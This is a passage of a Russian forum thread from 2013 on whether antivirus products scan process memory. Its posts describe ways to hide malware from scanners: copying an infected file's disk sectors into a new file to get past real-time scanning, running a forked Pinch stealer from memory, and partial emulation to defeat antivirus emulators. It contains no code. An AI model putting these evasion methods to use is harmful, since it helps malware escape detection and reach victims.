<img src="img/s6.gif" alt=""><br><img style="padding-top:3px;" src="av/4825.jpg" alt=""><br><span class=txtSm>Ранг: 216.9 (наставник), 85thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 14.15'>Активность: 0.31<span style='color:red'>&searr;</span>0.15</span><br>Статус: <a href="action=userinfo&amp;user=4825">Участник</a><br><font color=blue>X-Literator</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 10 октября 2013 12:09 <br><script type="text/javascript">QU('Crawler','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=Crawler" target="_blank">Личное сообщение</a> &middot;  <a href="#16" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=7&amp;topic=22241&amp;page=0#16');return false;">#16</a> </span><div align=left><br>
<b>SReg</b>, все так и думают, а на практике по-другому)
<br><br><font size="1"><i>-----<br>Харе курить веники и нюхать клей, к вам едет из Америки бог Шива, и он еврей.</i></font><br><br><span class="txtGoods"><a href="action=addthx&amp;post=332059&amp;user=4825&amp;forum_n=7&amp;topic=22241&amp;page=0&amp;anchor=16" class="addthx" data-post="332059"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="17" onfocus="this.blur()" href="JavaScript:di('[b]DenCoder[/b]','')">DenCoder</a></b><br></div>
<img src="img/s7.gif" alt=""><br><img style="padding-top:3px;" src="av/24257.jpg" alt=""><br><span class=txtSm>Ранг: 324.3 (мудрец), 221thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 10.42'>Активность: 0.48<span style='color:red'>&searr;</span>0.37</span><br>Статус: <a href="action=userinfo&amp;user=24257">Участник</a></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 10 октября 2013 12:26 &middot; Поправил: DenCoder <br><script type="text/javascript">QU('DenCoder','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=DenCoder" target="_blank">Личное сообщение</a> &middot;  <a href="#17" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=7&amp;topic=22241&amp;page=0#17');return false;">#17</a> </span><div align=left><br>
<b>SReg</b><br>Это мы думаем, что должен, для антивируса - это не факт. (Здесь же не говорится про проактивную защиту). На этом принципе основана &quot;безопасная&quot; загрузка малварей. 2 года назад ещё попадалась такая техника где-то в инете...<br><br>Кстати, второй способ проверки антивируса (большинство так же не среагируют):<br>Имеем заражённый файл, дектится.<br>1) Создаём файл размером нашего вируса, заполняем нулями<br>2) Открываем том (WinHex подойдёт)<br>3) Копируем сектора из файла вируса в новый<br><br>...Файловый монитор (или сканирование в режиме реального времени или ещё как оно называется) прошляпит <img src="img/smilies/s1.gif" alt="">
<br><br><font size="1"><i>-----<br>IZ.RU</i></font><br><br><span class="txtGoods"><a href="action=addthx&amp;post=332060&amp;user=24257&amp;forum_n=7&amp;topic=22241&amp;page=0&amp;anchor=17" class="addthx" data-post="332060"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="18" onfocus="this.blur()" href="JavaScript:di('[b]Crawler[/b]','')">Crawler</a></b><br></div>
<img src="img/s6.gif" alt=""><br><img style="padding-top:3px;" src="av/4825.jpg" alt=""><br><span class=txtSm>Ранг: 216.9 (наставник), 85thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 14.15'>Активность: 0.31<span style='color:red'>&searr;</span>0.15</span><br>Статус: <a href="action=userinfo&amp;user=4825">Участник</a><br><font color=blue>X-Literator</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 10 октября 2013 14:49 <br><script type="text/javascript">QU('Crawler','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=Crawler" target="_blank">Личное сообщение</a> &middot;  <a href="#18" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=7&amp;topic=22241&amp;page=0#18');return false;">#18</a> </span><div align=left><br>
<b>DenCoder</b>, точно, только что попробовал - прошляпил. Видимо, что-то не хучат)
<br><br><font size="1"><i>-----<br>Харе курить веники и нюхать клей, к вам едет из Америки бог Шива, и он еврей.</i></font><br><br><span class="txtGoods"><a href="action=addthx&amp;post=332063&amp;user=4825&amp;forum_n=7&amp;topic=22241&amp;page=0&amp;anchor=18" class="addthx" data-post="332063"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="19" onfocus="this.blur()" href="JavaScript:di('[b]DenCoder[/b]','')">DenCoder</a></b><br></div>
<img src="img/s7.gif" alt=""><br><img style="padding-top:3px;" src="av/24257.jpg" alt=""><br><span class=txtSm>Ранг: 324.3 (мудрец), 221thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 10.42'>Активность: 0.48<span style='color:red'>&searr;</span>0.37</span><br>Статус: <a href="action=userinfo&amp;user=24257">Участник</a></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 10 октября 2013 14:55 <br><script type="text/javascript">QU('DenCoder','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=DenCoder" target="_blank">Личное сообщение</a> &middot;  <a href="#19" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=7&amp;topic=22241&amp;page=0#19');return false;">#19</a> </span><div align=left><br>
На проактивках попробуй, кис, например. Нормальная проактивка должна детектить!
<br><br><font size="1"><i>-----<br>IZ.RU</i></font><br><br><span class="txtGoods"><a href="action=addthx&amp;post=332065&amp;user=24257&amp;forum_n=7&amp;topic=22241&amp;page=0&amp;anchor=19" class="addthx" data-post="332065"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="20" onfocus="this.blur()" href="JavaScript:di('[b]Airenikus[/b]','')">Airenikus</a></b><br></div>
<img src="img/s4.gif" alt=""><br><img style="padding-top:3px;" src="av/26065.png" alt=""><br><span class=txtSm>Ранг: 88.2 (постоянный), 111thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 9.94'>Активность: 0.07<span style='color:red'>&searr;</span>0.01</span><br>Статус: <a href="action=userinfo&amp;user=26065">Участник</a></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 13 октября 2013 13:09 <br><script type="text/javascript">QU('Airenikus','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=Airenikus" target="_blank">Личное сообщение</a> &middot;  <a href="#20" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=7&amp;topic=22241&amp;page=0#20');return false;">#20</a> </span><div align=left><br>
Слишком жирно будет для аверов еще и всю память процесса чекать =)
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=332203&amp;user=26065&amp;forum_n=7&amp;topic=22241&amp;page=0&amp;anchor=20" class="addthx" data-post="332203"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="21" onfocus="this.blur()" href="JavaScript:di('[b]Dr0p[/b]','')">Dr0p</a></b><br></div>
<img src="img/s4.gif" alt=""><br><img style="padding-top:3px;" src="av/33727.png" alt=""><br><span class=txtSm>Ранг: 72.3 (постоянный), 133thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 7.5'>Активность: 0.38<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=33727">Участник</a></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 03 декабря 2013 04:46 &middot; Поправил: Dr0p <br><script type="text/javascript">QU('Dr0p','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=Dr0p" target="_blank">Личное сообщение</a> &middot;  <a href="#21" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=7&amp;topic=22241&amp;page=0#21');return false;">#21</a> </span><div align=left><br>
<b>ELF_7719116</b><br><br>&gt; SE_LOCK_MEMORY_NAME (+AllocateUserPhysicalPages)- можно застолбить место в физической памяти<br><br>Интереса не представляет. Сервис обрабатывает только ранее выделенные области, нельзя произвольную память трогать.<br><br>По сабжу хз как щас у них, раньше(год два назад) только флай память сканил(из сигнатурных сканеров). Было предложено раскодировать инструкцию по одной и исполнять в буфере. Затем был реализован концепт и мотор(VMBE). Но к такому коду есть неокторые требования, например исполняемый блок не должен содержать в себе данных(микод, динамическая генерация данных, базонезависим), не должно быть колбеков(так как только одна инструкция в памяти). Для колбеков можно создать ожидающую страницу или сегмент(на x86).<br><br>Это сугубо теоретические методы, в реале код нужно криптовать. Просто не вижу смысла скрывать один блок.<br><br><b>Crawler</b><br><br>&gt; Авира не находит ничего подозрительного, хотя если посмотреть отладчиком, видно, что в памяти образ пинча<br><br>В какой памяти, виртуальной аверской машины ?<br><br>Обломилась эмуляция(не помню, там вообще эмуль хоть есть <img src="img/smilies/s15.gif" alt=""> ), вот и не детектит ничего <img src="img/smilies/s1.gif" alt="">
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=334672&amp;user=33727&amp;forum_n=7&amp;topic=22241&amp;page=0&amp;anchor=21" class="addthx" data-post="334672"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="22" onfocus="this.blur()" href="JavaScript:di('[b]Crawler[/b]','')">Crawler</a></b><br></div>
<img src="img/s6.gif" alt=""><br><img style="padding-top:3px;" src="av/4825.jpg" alt=""><br><span class=txtSm>Ранг: 216.9 (наставник), 85thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 14.15'>Активность: 0.31<span style='color:red'>&searr;</span>0.15</span><br>Статус: <a href="action=userinfo&amp;user=4825">Участник</a><br><font color=blue>X-Literator</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 03 декабря 2013 11:38 <br><script type="text/javascript">QU('Crawler','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=Crawler" target="_blank">Личное сообщение</a> &middot;  <a href="#22" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=7&amp;topic=22241&amp;page=0#22');return false;">#22</a> </span><div align=left><br>
<b>Dr0p</b>, тогда обломилась эмуляция заодно у касперыча, др. веба и нода) проверено. Хочешь - повтори опыт)
<br><br><font size="1"><i>-----<br>Харе курить веники и нюхать клей, к вам едет из Америки бог Шива, и он еврей.</i></font><br><br><span class="txtGoods"><a href="action=addthx&amp;post=334677&amp;user=4825&amp;forum_n=7&amp;topic=22241&amp;page=0&amp;anchor=22" class="addthx" data-post="334677"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="23" onfocus="this.blur()" href="JavaScript:di('[b]Dr0p[/b]','')">Dr0p</a></b><br></div>
<img src="img/s4.gif" alt=""><br><img style="padding-top:3px;" src="av/33727.png" alt=""><br><span class=txtSm>Ранг: 72.3 (постоянный), 133thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 7.5'>Активность: 0.38<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=33727">Участник</a></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 03 декабря 2013 15:00 <br><script type="text/javascript">QU('Dr0p','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=Dr0p" target="_blank">Личное сообщение</a> &middot;  <a href="#23" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=7&amp;topic=22241&amp;page=0#23');return false;">#23</a> </span><div align=left><br>
<b>Crawler</b><br><br>Ну а с чего вы взяли что вообще был анализ ?<br><br>Ну а во вторых эмуляторы говнище, что удивительного что отвалились все не пойму.<br><br>&gt; Хочешь - повтори опыт) <br><br>Что я там не видел <img src="img/smilies/s11.gif" alt="">
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=334685&amp;user=33727&amp;forum_n=7&amp;topic=22241&amp;page=0&amp;anchor=23" class="addthx" data-post="334685"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="24" onfocus="this.blur()" href="JavaScript:di('[b]Crawler[/b]','')">Crawler</a></b><br></div>
<img src="img/s6.gif" alt=""><br><img style="padding-top:3px;" src="av/4825.jpg" alt=""><br><span class=txtSm>Ранг: 216.9 (наставник), 85thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 14.15'>Активность: 0.31<span style='color:red'>&searr;</span>0.15</span><br>Статус: <a href="action=userinfo&amp;user=4825">Участник</a><br><font color=blue>X-Literator</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 04 декабря 2013 13:29 <br><script type="text/javascript">QU('Crawler','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=Crawler" target="_blank">Личное сообщение</a> &middot;  <a href="#24" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=7&amp;topic=22241&amp;page=0#24');return false;">#24</a> </span><div align=left><br>
<b>Dr0p</b><br><br>Целый файл палят =&gt; анализ был. Хотя я не настаиваю, это не так интересно
<br><br><font size="1"><i>-----<br>Харе курить веники и нюхать клей, к вам едет из Америки бог Шива, и он еврей.</i></font><br><br><span class="txtGoods"><a href="action=addthx&amp;post=334724&amp;user=4825&amp;forum_n=7&amp;topic=22241&amp;page=0&amp;anchor=24" class="addthx" data-post="334724"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="25" onfocus="this.blur()" href="JavaScript:di('[b]Dr0p[/b]','')">Dr0p</a></b><br></div>
<img src="img/s4.gif" alt=""><br><img style="padding-top:3px;" src="av/33727.png" alt=""><br><span class=txtSm>Ранг: 72.3 (постоянный), 133thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 7.5'>Активность: 0.38<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=33727">Участник</a></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 04 декабря 2013 14:33 <br><script type="text/javascript">QU('Dr0p','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=Dr0p" target="_blank">Личное сообщение</a> &middot;  <a href="#25" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=7&amp;topic=22241&amp;page=0#25');return false;">#25</a> </span><div align=left><br>
<b>Crawler</b><br><br>Значит очевидно - обламывается эмуляция, если дальше просканить тем же флаем то будет детект.
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=334738&amp;user=33727&amp;forum_n=7&amp;topic=22241&amp;page=0&amp;anchor=25" class="addthx" data-post="334738"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="26" onfocus="this.blur()" href="JavaScript:di('[b]Nimnul[/b]','')">Nimnul</a></b><br></div>
<img src="img/s6.gif" alt=""><br><img style="padding-top:3px;" src="av/1619.gif" alt=""><br><span class=txtSm>Ранг: 218.9 (наставник), 42thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 15.25'>Активность: 0.16<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=1619">Участник</a><br><font color=blue>dotnet</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 05 декабря 2013 16:19 <br><script type="text/javascript">QU('Nimnul','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=Nimnul" target="_blank">Личное сообщение</a> &middot;  <a href="#26" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=7&amp;topic=22241&amp;page=0#26');return false;">#26</a> </span><div align=left><br>
Прости разбираться в твоем сорце нет времени, но или ты пинча запихнул в read\write only память, или ты просто не сможешь запусть в него поток. Попробуй, можешь ли ты запустить код. Даже в своем процессе.
<br><br><font size="1"><i>-----<br>have a nice day</i></font><br><br><span class="txtGoods"><a href="action=addthx&amp;post=334798&amp;user=1619&amp;forum_n=7&amp;topic=22241&amp;page=0&amp;anchor=26" class="addthx" data-post="334798"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="27" onfocus="this.blur()" href="JavaScript:di('[b]Crawler[/b]','')">Crawler</a></b><br></div>
<img src="img/s6.gif" alt=""><br><img style="padding-top:3px;" src="av/4825.jpg" alt=""><br><span class=txtSm>Ранг: 216.9 (наставник), 85thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 14.15'>Активность: 0.31<span style='color:red'>&searr;</span>0.15</span><br>Статус: <a href="action=userinfo&amp;user=4825">Участник</a><br><font color=blue>X-Literator</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 06 декабря 2013 17:31 <br><script type="text/javascript">QU('Crawler','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=Crawler" target="_blank">Личное сообщение</a> &middot;  <a href="#27" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=7&amp;topic=22241&amp;page=0#27');return false;">#27</a> </span><div align=left><br>
<b>Nimnul</b>, я же говорю, форкнул пинча, всё работает без проблем.
<br><br><font size="1"><i>-----<br>Харе курить веники и нюхать клей, к вам едет из Америки бог Шива, и он еврей.</i></font><br><br><span class="txtGoods"><a href="action=addthx&amp;post=334825&amp;user=4825&amp;forum_n=7&amp;topic=22241&amp;page=0&amp;anchor=27" class="addthx" data-post="334825"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="28" onfocus="this.blur()" href="JavaScript:di('[b]Nimnul[/b]','')">Nimnul</a></b><br></div>
<img src="img/s6.gif" alt=""><br><img style="padding-top:3px;" src="av/1619.gif" alt=""><br><span class=txtSm>Ранг: 218.9 (наставник), 42thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 15.25'>Активность: 0.16<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=1619">Участник</a><br><font color=blue>dotnet</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 13 декабря 2013 17:51 <br><script type="text/javascript">QU('Nimnul','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=Nimnul" target="_blank">Личное сообщение</a> &middot;  <a href="#28" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=7&amp;topic=22241&amp;page=0#28');return false;">#28</a> </span><div align=left><br>
Значит у тебя отключенный DEP. Или у тебя старая винда или ты отключил его сам ;)
<br><br><font size="1"><i>-----<br>have a nice day</i></font><br><br><span class="txtGoods"><a href="action=addthx&amp;post=335129&amp;user=1619&amp;forum_n=7&amp;topic=22241&amp;page=0&amp;anchor=28" class="addthx" data-post="335129"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="29" onfocus="this.blur()" href="JavaScript:di('[b]Crawler[/b]','')">Crawler</a></b><br></div>
<img src="img/s6.gif" alt=""><br><img style="padding-top:3px;" src="av/4825.jpg" alt=""><br><span class=txtSm>Ранг: 216.9 (наставник), 85thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 14.15'>Активность: 0.31<span style='color:red'>&searr;</span>0.15</span><br>Статус: <a href="action=userinfo&amp;user=4825">Участник</a><br><font color=blue>X-Literator</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 23 декабря 2013 17:36 <br><script type="text/javascript">QU('Crawler','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=Crawler" target="_blank">Личное сообщение</a> &middot;  <a href="#29" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=7&amp;topic=22241&amp;page=0#29');return false;">#29</a> </span><div align=left><br>
<b>Nimnul</b>, если верить глазам, то включен.<br><br><img src="img/attach.gif" alt=""> <a href="./files/19b9_23.12.2013_EXELAB.rU.tgz">19b9_23.12.2013_EXELAB.rU.tgz</a> - New Bitmap Image.jpg
<br><br><font size="1"><i>-----<br>Харе курить веники и нюхать клей, к вам едет из Америки бог Шива, и он еврей.</i></font><br><br><span class="txtGoods"><a href="action=addthx&amp;post=335511&amp;user=4825&amp;forum_n=7&amp;topic=22241&amp;page=0&amp;anchor=29" class="addthx" data-post="335511"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="30" onfocus="this.blur()" href="JavaScript:di('[b]Dr0p[/b]','')">Dr0p</a></b><br></div>
<img src="img/s4.gif" alt=""><br><img style="padding-top:3px;" src="av/33727.png" alt=""><br><span class=txtSm>Ранг: 72.3 (постоянный), 133thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 7.5'>Активность: 0.38<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=33727">Участник</a></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 24 декабря 2013 03:21 &middot; Поправил: Dr0p <br><script type="text/javascript">QU('Dr0p','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=Dr0p" target="_blank">Личное сообщение</a> &middot;  <a href="#30" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=7&amp;topic=22241&amp;page=0#30');return false;">#30</a> </span><div align=left><br>
<b>Crawler</b><br><br>Во первых DEP технология, затрагивающая множество механизмов. NX память, открываемая динамически, так же как и NXSEH/SAFESEH набором флагов не только налету, но и при старте оси(бутини). Во вторых причём она тут ?<br><br>Полагаю тс получил законченный ответ в #21. Частичная эмуляция как универсальный способ обхода AVVM. Берёте VMBE(мотор), описываете критерий в колбеке и получаете профит в виде долгого недетекта, зависящего от этого критерия(предлагаю регистровую раскодировку).<br><br>Ну а причину остановки вм в данном случае можно получить либо отладкой вм, либо брутом. Это нельзя угадать и сделать предположение, так как хз что у вм на уме <img src="img/smilies/s1.gif" alt="">
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=335536&amp;user=33727&amp;forum_n=7&amp;topic=22241&amp;page=0&amp;anchor=30" class="addthx" data-post="335536"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:inline"> | Сообщение посчитали полезным: <span class="total_thx"><a href="action=userinfo&user=4825" title="24-12-2013 13:20, ранг:178.7" target="_blank">Crawler</a></span></span></span><br></div></td>
</tr>


</table>
<table class=tbTransparent><tr><td class=tbTransparent><span class=txtSm><b> .  <b>1</b> . <a href="action=vthread&amp;forum=7&amp;topic=22241&amp;page=1.html">2</a> . <a href="action=vthread&amp;forum=7&amp;topic=22241&amp;page=1.html">&gt;&gt;</a></b></span></td></tr></table>
<table class=forums><tr>
<td width=16 valign=top class=caption3><img src="./img/forum_icons/mod.gif" width=16 height=16 alt=""></td>
<td width="100%" class=caption3><span class=header>&nbsp;<a href="../index.html"><b>eXeL@B</b></a> <b class=bulletHead>&#8212;&#8250;</b> <a href="action=vtopic&amp;forum=7&sortBy=0&page=0.html"><b>Оффтоп</b></a> <b class=bulletHead>&#8212;&#8250;</b> А проверяют ли антивирусы память?</span></td>
</tr></table>
</div>
<a name=newreply></a>
<center><h3>У вас должно быть 20 пунктов ранга, чтобы оставлять сообщения в  этом подфоруме, но у вас только 0</h3></center><script type="text/javascript" src="templates/vthread_logged.js"></script>
<div align=center><table class=tbTransparent><tr>
<td class=tbTransparent><span class=txtSm>      &nbsp;&nbsp;&nbsp;<a href="/f/forprint.php?topic_id=22241" title="Версия для печати"><img src="img/forprint.gif" border="0" alt="Для печати"> Для печати</a>&nbsp;</span></td>
</tr></table></div>
<br>
 
<br><br><br></center>

</div>
<div id="footer">Вы находитесь на EXELAB.rU</div>
<div id="footer_btns">
<a href="http://www.reactos.org" rel="nofollow" target="_blank"><img src="./images/react.png" height="31" width="88" border="0" title="" alt=""></a> <script type="text/javascript"><!--
document.write("<img src='//counter.yadro.ru/hit?t44.2;r"+
escape(document.referrer)+((typeof(screen)=="undefined")?"":
";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
";h"+escape(document.title.substring(0,80))+";"+Math.random()+
"' "+
"border='0' width='31' height='31'>")
//--></script>
</div>
</div>

</body></html>
